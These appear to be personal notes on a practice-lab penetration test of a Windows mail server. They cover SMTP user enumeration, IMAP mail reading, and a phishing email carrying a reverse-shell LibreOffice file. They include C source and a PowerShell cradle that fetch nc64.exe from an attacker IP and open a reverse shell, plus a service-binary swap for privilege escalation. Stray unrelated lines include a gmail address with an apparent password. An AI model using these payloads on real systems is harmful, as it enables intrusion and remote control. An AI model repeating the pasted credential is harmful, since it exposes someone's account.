#### info enumerate
```
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: APOP UIDL TOP EXPIRE(NEVER) USER
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: AUTH=PLAIN OK X-MERCURY-1A0001 IMAP4rev1 complete CAPABILITY
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Time Travel Company Page
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Time Travel Company Page
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
```
From port 8000
http://192.168.243.140:8000/
get a user list, save it into user  

and  jonas  SicMundusCreatusEst


`└─$ smtp-user-enum -M VRFY  -U user -t 192.168.243.140 `
```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... user
Target count ............. 1
Username count ........... 6
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sun Aug  9 07:57:19 2026 #########
192.168.243.140: jonas exists
192.168.243.140: agnes exists
192.168.243.140: magnus exists
192.168.243.140: charlotte exists
192.168.243.140: martha exists
######## Scan completed at Sun Aug  9 07:57:19 2026 #########
5 results.
```
port 143 IMAP

`└─$ telnet 192.168.243.140 143   `
```
Trying 192.168.243.140...
Connected to 192.168.243.140.
Escape character is '^]'.
* OK localhost IMAP4rev1 Mercury/32 v4.62 server ready.
help
* BAD Malformed command or oversize literal.
help
* BAD Malformed command or oversize literal.
a1
* BAD Malformed command or oversize literal.
a1 login 'jonas' 'SicMundusCreatusEst'
a1 NO Username or password incorrect.
a1 login jonas SicMundusCreatusEst
a1 OK LOGIN completed.
a1 list
a1 BAD Syntax error in LIST command.
a1 list "" *
* LIST (\NoInferiors) "/" INBOX
a1 OK LIST completed.
A1 SELECT INBOX
* 5 EXISTS
* 0 RECENT
* FLAGS (\Deleted \Draft \Seen \Answered)
* OK [UIDVALIDITY 1786261605] UID Validity
* OK [UIDNEXT 6] Predicted next UID
* OK [PERMANENTFLAGS (\Deleted \Draft \Seen \Answered)] Settable message flags
A1 OK [READ-WRITE] SELECT completed.
```

`a1 fetch 1 body[text]`
```
* 1 FETCH (BODY[text] {470}
This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-502425.856729136
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Hey Jonas,

Please change your password, you cannot use the same password as your one liner description, just dont.

Thanks!


------MIME delimiter for sendEmail-502425.856729136--

)
* 1 FETCH (FLAGS (\SEEN))
a1 OK FETCH complete.

a1 fetch 5 body[text]

get a base64 text

curl -k 'imaps://192.168.243.140/inbox;MAILINDEX=5' --user jonas:SicMundusCreatusEst


a1 fetch 2 body[text]
* 2 FETCH (BODY[text] {647}
This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-808784.915440814
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 

I will forward all the documents after checking everything is working okay. 
```

`a1 fetch 2 body[header]`
```
* 2 FETCH (BODY[header] {739}
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:41 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <mailadmin@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000001;
   19 Oct 2020 12:28:40 -0700
Message-ID: <359094.447081105-sendEmail@kali>
From: "mailadmin@localhost" <mailadmin@localhost>
To: "agnes@localhost" <agnes@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Important
Date: Mon, 19 Oct 2020 19:28:39 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-808784.915440814"
X-PMFLAGS: 570949760 0 1 YGWVEUL6.CNM

)
a1 OK FETCH complete.
```
since the postadmin will forward the attached file to be verified, let set a revereshell odt or ods file to the admin. 

https://github.com/0bfxgh0st/MMG-LO/

`└─$ python3 mmg-odt.py windows 192.168.45.171 8821`
```
[+] Payload: windows reverse shell
[+] Creating malicious .odt file

Done.
```
#### foot hold

`└─$ sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.243.140 --body "bd" --header "Subject: check this doc" --suppress-data`
```
=== Trying 192.168.243.140:25...
=== Connected to 192.168.243.140.
<-  220 localhost ESMTP server ready.
 -> EHLO kali
<-  250-localhost Hello kali; ESMTPs are:
<-  250-TIME
<-  250-SIZE 0
<-  250 HELP
 -> MAIL FROM:<jonas@localhost>
<-  250 Sender OK - send RCPTs.
 -> RCPT TO:<mailadmin@localhost>
<-  250 Recipient OK - send RCPT or DATA.
 -> DATA
<-  354 OK, send data, end with CRLF.CRLF
 -> 197 lines sent
<-  250 Data received OK.
 -> QUIT
<-  221 localhost Service closing channel.
=== Connection closed with remote host.
```

     File:  820.bmp
     Date:  24 Oct 2001, 17:14
     Size:  21164 bytes.
     Type:  Unknown


jarvarisrivetteuf3409@gmail.com
VG7j2eeg4C


f'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.171/nc64.exe");nc64.exe {ip} {port} -e powershell'

#### priv es
run winpeas
```
???????????? Interesting Services -non Microsoft-
? Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    MozillaMaintenance(Mozilla Foundation - Mozilla Maintenance Service)["C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"] - Manual - Stopped
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\WINDOWS\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    VeyonService(Veyon Solutions - Veyon Service)[C:\Users\Ela Arwel\Veyon\veyon-service.exe] - Auto - Running - No quotes and Space detected
    File Permissions: Ela Arwel [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Users\Ela Arwel\Veyon (Ela Arwel [Allow: AllAccess])
```

`PS C:\Users\Ela Arwel\Veyon> (Get-Acl veyon-service.exe).Owner`
```
BUILTIN\Administrators
```

`PS C:\Users\Ela Arwel\Veyon> icacls veyon-service.exe`
```
veyon-service.exe NT AUTHORITY\SYSTEM:(I)(F)
                  BUILTIN\Administrators:(I)(F)
                  HEPET\Ela Arwel:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```
`└─$ cat c_rev_exe.c `
```
#include <stdlib.h>
#include <stdio.h>

#define ATTACKER_IP "192.168.45.171"
#define ATTACKER_PORT "8822"

int main(void) {
    char downloadCmd[512];
    char reverseShellCmd[512];

    // Build the download command using PowerShell's Invoke-WebRequest
    snprintf(downloadCmd, sizeof(downloadCmd),
        "if not exist C:\\Users\\Public\\nc64.exe powershell -Command \"iwr -Uri http://%s/nc64.exe -OutFile C:\\Users\\Public\\nc64.exe\"",
        ATTACKER_IP);
    system(downloadCmd);

    // Build the reverse shell command using netcat
    snprintf(reverseShellCmd, sizeof(reverseShellCmd),
        "C:\\Users\\Public\\nc64.exe %s %s -e cmd.exe",
        ATTACKER_IP, ATTACKER_PORT);
    system(reverseShellCmd);

    return 0;
}
```
`x86_64-w64-mingw32-gcc --static -o e.exe c_rev_exe.c `

```
PS C:\Users\Ela Arwel\Veyon> wget http://192.168.45.171/e.exe -o e.exe
PS C:\Users\Ela Arwel\Veyon> move veyon-service.exe veyon-service.bak
PS C:\Users\Ela Arwel\Veyon> move e.exe veyon-service.exe
PS C:\Users\Ela Arwel\Veyon> Restat-Service VeyonService
```
To restart the service, we can shutdown the system using:

shutdown /r /t 0

#### lesson learned
- IMAP interact
- stmp user verify
- odt ods etc. malicious revereshell creation
- gcc rever.exe from .c file
- check win service to PRIv ES
- check file owner and priv:  dir /q in CMD, and   (Get-Acl veyon-service.exe).Owner in Powershell
